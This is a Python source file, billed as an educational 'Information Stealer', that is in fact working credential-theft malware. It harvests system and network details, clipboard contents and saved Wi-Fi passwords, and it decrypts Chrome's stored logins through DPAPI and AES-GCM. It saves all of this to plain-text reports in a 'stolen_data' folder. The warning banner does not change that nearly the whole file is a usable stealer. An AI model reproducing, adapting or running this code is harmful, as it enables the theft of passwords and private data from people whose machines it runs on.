#!/usr/bin/env python3
"""
Information Stealer - Educational Purpose Only
By Inlighn Tech

WARNING: This script is for educational purposes only.
Unauthorized data collection is illegal and unethical.
Only use on systems you own or have explicit permission to test.
"""

import os
import sys
import json
import sqlite3
import base64
import win32crypt
import platform
import socket
import subprocess
import re
from datetime import datetime
from typing import Dict, List, Tuple, Optional
import shutil

# Third-party imports
try:
    import pyperclip
    import requests
    from Cryptodome.Cipher import AES
    from win32com.client import Dispatch
except ImportError as e:
    print(f"[!] Missing required module: {e}")
    print("[*] Install required modules: pip install pyperclip requests pycryptodome pywin32")
    sys.exit(1)

class InformationStealer:
    """Information Stealer Implementation"""
    
    def __init__(self):
        self.os_name = platform.system()
        self.stolen_data = {
            'timestamp': datetime.now().isoformat(),
            'system_info': {},
            'browser_passwords': [],
            'clipboard_data': [],
            'network_info': {},
            'installed_software': [],
            'wifi_profiles': []
        }
        self.output_dir = "stolen_data"
        os.makedirs(self.output_dir, exist_ok=True)
        
    def run(self) -> None:
        """Execute all information stealing functions"""
        print("=" * 60)
        print("INFORMATION STEALER - Educational Demo")
        print("By Inlighn Tech")
        print("=" * 60)
        print("\n[WARNING] This is for educational purposes only!")
        print("[*] Collecting information...\n")
        
        try:
            # Collect all information
            self.collect_system_info()
            self.collect_network_info()
            self.collect_software_info()
            self.collect_wifi_profiles()
            self.collect_clipboard_data()
            self.extract_chrome_passwords()
            
            # Save collected data
            self.save_data()
            self.generate_report()
            
            print(f"\n[+] Data collection complete. Results saved to: {self.output_dir}/")
            
        except Exception as e:
            print(f"[!] Error during collection: {e}")
    
    def collect_system_info(self) -> None:
        """Collect system information"""
        print("[*] Collecting system information...")
        
        system_info = {
            'os': platform.system(),
            'os_version': platform.version(),
            'os_release': platform.release(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'hostname': socket.gethostname(),
            'username': os.getlogin() if hasattr(os, 'getlogin') else 'Unknown',
            'system_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        # Additional Windows-specific info
        if self.os_name == 'Windows':
            try:
                import winreg
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
                    system_info['windows_version'] = winreg.QueryValueEx(key, "ProductName")[0]
                    system_info['windows_build'] = winreg.QueryValueEx(key, "CurrentBuildNumber")[0]
            except:
                pass
        
        self.stolen_data['system_info'] = system_info
        print(f"[+] System: {system_info['os']} {system_info['os_version']}")
        print(f"[+] Hostname: {system_info['hostname']}")
    
    def collect_network_info(self) -> None:
        """Collect network information"""
        print("[*] Collecting network information...")
        
        network_info = {
            'public_ip': self.get_public_ip(),
            'local_ip': self.get_local_ip(),
            'mac_address': self.get_mac_address(),
            'hostname': socket.gethostname()
        }
        
        self.stolen_data['network_info'] = network_info
        print(f"[+] Public IP: {network_info['public_ip']}")
        print(f"[+] Local IP: {network_info['local_ip']}")
    
    def get_public_ip(self) -> str:
        """Get public IP address"""
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            return response.json().get('ip', 'Unknown')
        except:
            try:
                response = requests.get('https://httpbin.org/ip', timeout=5)
                return response.json().get('origin', 'Unknown')
            except:
                return 'Unable to determine'
    
    def get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return socket.gethostbyname(socket.gethostname())
    
    def get_mac_address(self) -> str:
        """Get MAC address"""
        try:
            if self.os_name == 'Windows':
                result = subprocess.run(['getmac', '/fo', 'csv', '/nh'], 
                                      capture_output=True, text=True)
                if result.stdout:
                    mac = result.stdout.split(',')[0].strip('"')
                    return mac
            else:
                result = subprocess.run(['ifconfig'], capture_output=True, text=True)
                mac_match = re.search(r'ether\s+([0-9a-f:]{17})', result.stdout)
                if mac_match:
                    return mac_match.group(1)
            return 'Unknown'
        except:
            return 'Unknown'
    
    def collect_software_info(self) -> None:
        """Collect installed software information"""
        print("[*] Collecting installed software...")
        
        software_list = []
        
        if self.os_name == 'Windows':
            try:
                import winreg
                # 64-bit software
                reg_paths = [
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
                ]
                
                for reg_path in reg_paths:
                    try:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
                            for i in range(0, winreg.QueryInfoKey(key)[0]):
                                try:
                                    subkey_name = winreg.EnumKey(key, i)
                                    with winreg.OpenKey(key, subkey_name) as subkey:
                                        try:
                                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                            if name:
                                                software_list.append(name)
                                        except:
                                            pass
                                except:
                                    pass
                    except:
                        pass
            except:
                pass
        else:
            # Linux/Unix
            try:
                result = subprocess.run(['dpkg', '-l'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if line.startswith('ii'):
                        parts = line.split()
                        if len(parts) >= 3:
                            software_list.append(f"{parts[1]} {parts[2]}")
            except:
                pass
        
        # Limit to first 100 entries to keep report manageable
        self.stolen_data['installed_software'] = software_list[:100]
        print(f"[+] Found {len(software_list)} installed software")
    
    def collect_wifi_profiles(self) -> None:
        """Collect WiFi profiles and passwords (Windows only)"""
        print("[*] Collecting WiFi profiles...")
        
        wifi_profiles = []
        
        if self.os_name == 'Windows':
            try:
                # Get all WiFi profiles
                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                      capture_output=True, text=True)
                
                # Parse profile names
                profile_names = re.findall(r': (.*?)\r?\n', result.stdout)
                
                for profile in profile_names:
                    try:
                        # Get profile details including password
                        details = subprocess.run(
                            ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                            capture_output=True, text=True
                        )
                        
                        # Extract password
                        password_match = re.search(r'Key Content\s*:\s*(.*?)\r?\n', details.stdout)
                        password = password_match.group(1).strip() if password_match else 'No password'
                        
                        wifi_profiles.append({
                            'ssid': profile.strip(),
                            'password': password
                        })
                    except:
                        pass
            except:
                pass
        
        self.stolen_data['wifi_profiles'] = wifi_profiles
        print(f"[+] Found {len(wifi_profiles)} WiFi profiles")
    
    def collect_clipboard_data(self) -> None:
        """Collect clipboard data"""
        print("[*] Collecting clipboard data...")
        
        try:
            clipboard_content = pyperclip.paste()
            if clipboard_content:
                self.stolen_data['clipboard_data'].append({
                    'timestamp': datetime.now().isoformat(),
                    'content': clipboard_content[:1000]  # Limit content
                })
                print("[+] Clipboard data collected")
            else:
                print("[!] No clipboard data found")
        except Exception as e:
            print(f"[!] Clipboard error: {e}")
    
    def extract_chrome_passwords(self) -> None:
        """Extract saved passwords from Google Chrome"""
        print("[*] Extracting Chrome passwords...")
        
        try:
            # Determine Chrome data path
            if self.os_name == 'Windows':
                chrome_path = os.path.join(os.environ['USERPROFILE'], 
                                         'AppData', 'Local', 'Google', 'Chrome', 'User Data')
            elif self.os_name == 'Darwin':  # macOS
                chrome_path = os.path.join(os.environ['HOME'], 
                                         'Library', 'Application Support', 'Google', 'Chrome')
            else:  # Linux
                chrome_path = os.path.join(os.environ['HOME'], 
                                         '.config', 'google-chrome')
            
            login_db_path = os.path.join(chrome_path, 'Default', 'Login Data')
            
            if not os.path.exists(login_db_path):
                print("[!] Chrome Login Data not found")
                return
            
            # Copy database to avoid lock issues
            temp_db_path = os.path.join(self.output_dir, 'LoginData_temp.db')
            shutil.copy2(login_db_path, temp_db_path)
            
            # Connect to database
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            # Get encryption key
            encryption_key = self.get_chrome_encryption_key(chrome_path)
            if not encryption_key:
                print("[!] Could not retrieve encryption key")
                conn.close()
                os.remove(temp_db_path)
                return
            
            # Query login data
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            passwords = []
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                try:
                    # Decrypt password
                    if self.os_name == 'Windows':
                        # Use Windows API for older Chrome versions
                        try:
                            decrypted = win32crypt.CryptUnprotectData(encrypted_password)[1].decode('utf-8')
                        except:
                            # Use AES decryption for newer Chrome versions
                            decrypted = self.decrypt_chrome_password(encrypted_password, encryption_key)
                    else:
                        decrypted = self.decrypt_chrome_password(encrypted_password, encryption_key)
                    
                    if decrypted:
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': decrypted,
                            'timestamp': datetime.now().isoformat()
                        })
                except Exception as e:
                    pass
            
            conn.close()
            os.remove(temp_db_path)
            
            self.stolen_data['browser_passwords'] = passwords
            print(f"[+] Found {len(passwords)} saved Chrome passwords")
            
            # Display some of them
            for p in passwords[:5]:
                print(f"    - {p['url']}: {p['username']} / {p['password']}")
            if len(passwords) > 5:
                print(f"    ... and {len(passwords) - 5} more")
                
        except Exception as e:
            print(f"[!] Error extracting Chrome passwords: {e}")
    
    def get_chrome_encryption_key(self, chrome_path: str) -> Optional[bytes]:
        """Get Chrome encryption key from Local State file"""
        try:
            local_state_path = os.path.join(chrome_path, 'Local State')
            if not os.path.exists(local_state_path):
                return None
            
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            
            # Remove 'DPAPI' prefix
            encrypted_key = encrypted_key[5:]
            
            if self.os_name == 'Windows':
                # Decrypt using Windows Data Protection API
                return win32crypt.CryptUnprotectData(encrypted_key)[1]
            else:
                # For Linux/macOS, this is more complex
                # This is a simplified version for educational purposes
                return encrypted_key
                
        except Exception as e:
            print(f"[!] Error getting encryption key: {e}")
            return None
    
    def decrypt_chrome_password(self, encrypted_password: bytes, key: bytes) -> str:
        """Decrypt Chrome password using AES"""
        try:
            # For newer Chrome versions
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            
            return decrypted.decode('utf-8')
        except:
            return ''
    
    def save_data(self) -> None:
        """Save collected data to files"""
        print("[*] Saving collected data...")
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Save JSON report
        json_file = os.path.join(self.output_dir, f'steal_data_{timestamp}.json')
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(self.stolen_data, f, indent=2, ensure_ascii=False)
        
        # Save passwords separately
        if self.stolen_data['browser_passwords']:
            pass_file = os.path.join(self.output_dir, f'passwords_{timestamp}.txt')
            with open(pass_file, 'w', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write("EXTRACTED PASSWORDS\n")
                f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n\n")
                
                for p in self.stolen_data['browser_passwords']:
                    f.write(f"URL: {p['url']}\n")
                    f.write(f"Username: {p['username']}\n")
                    f.write(f"Password: {p['password']}\n")
                    f.write("-" * 40 + "\n")
        
        # Save WiFi passwords
        if self.stolen_data['wifi_profiles']:
            wifi_file = os.path.join(self.output_dir, f'wifi_{timestamp}.txt')
            with open(wifi_file, 'w', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write("WIFI PROFILES\n")
                f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n\n")
                
                for wifi in self.stolen_data['wifi_profiles']:
                    f.write(f"SSID: {wifi['ssid']}\n")
                    f.write(f"Password: {wifi['password']}\n")
                    f.write("-" * 40 + "\n")
        
        print(f"[+] Data saved to: {json_file}")
    
    def generate_report(self) -> None:
        """Generate human-readable report"""
        print("[*] Generating report...")
        
        report_file = os.path.join(self.output_dir, 'report.txt')
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("INFORMATION STEALER - COLLECTION REPORT\n")
            f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            
            # System Info
            f.write("SYSTEM INFORMATION\n")
            f.write("-" * 40 + "\n")
            for key, value in self.stolen_data['system_info'].items():
                f.write(f"{key}: {value}\n")
            f.write("\n")
            
            # Network Info
            f.write("NETWORK INFORMATION\n")
            f.write("-" * 40 + "\n")
            for key, value in self.stolen_data['network_info'].items():
                f.write(f"{key}: {value}\n")
            f.write("\n")
            
            # Chrome Passwords Summary
            f.write("CHROME PASSWORDS\n")
            f.write("-" * 40 + "\n")
            f.write(f"Total passwords found: {len(self.stolen_data['browser_passwords'])}\n\n")
            if self.stolen_data['browser_passwords']:
                for p in self.stolen_data['browser_passwords'][:10]:
                    f.write(f"  - {p['url']} | {p['username']} | {p['password']}\n")
                if len(self.stolen_data['browser_passwords']) > 10:
                    f.write(f"  ... and {len(self.stolen_data['browser_passwords']) - 10} more\n")
            f.write("\n")
            
            # WiFi Profiles
            f.write("WIFI PROFILES\n")
            f.write("-" * 40 + "\n")
            f.write(f"Total profiles found: {len(self.stolen_data['wifi_profiles'])}\n\n")
            for wifi in self.stolen_data['wifi_profiles'][:10]:
                f.write(f"  - {wifi['ssid']} | {wifi['password']}\n")
            if len(self.stolen_data['wifi_profiles']) > 10:
                f.write(f"  ... and {len(self.stolen_data['wifi_profiles']) - 10} more\n")
            f.write("\n")
            
            # Clipboard Data
            f.write("CLIPBOARD DATA\n")
            f.write("-" * 40 + "\n")
            if self.stolen_data['clipboard_data']:
                for clip in self.stolen_data['clipboard_data']:
                    f.write(f"Time: {clip['timestamp']}\n")
                    f.write(f"Content: {clip['content'][:500]}\n")
                    f.write("-" * 20 + "\n")
            else:
                f.write("No clipboard data captured\n")
            f.write("\n")
            
            # Installed Software
            f.write("INSTALLED SOFTWARE (Top 50)\n")
            f.write("-" * 40 + "\n")
            for sw in self.stolen_data['installed_software'][:50]:
                f.write(f"  - {sw}\n")
            if len(self.stolen_data['installed_software']) > 50:
                f.write(f"  ... and {len(self.stolen_data['installed_software']) - 50} more\n")
        
        print(f"[+] Report saved to: {report_file}")

def main():
    """Main function"""
    stealer = InformationStealer()
    stealer.run()

if __name__ == "__main__":
    main()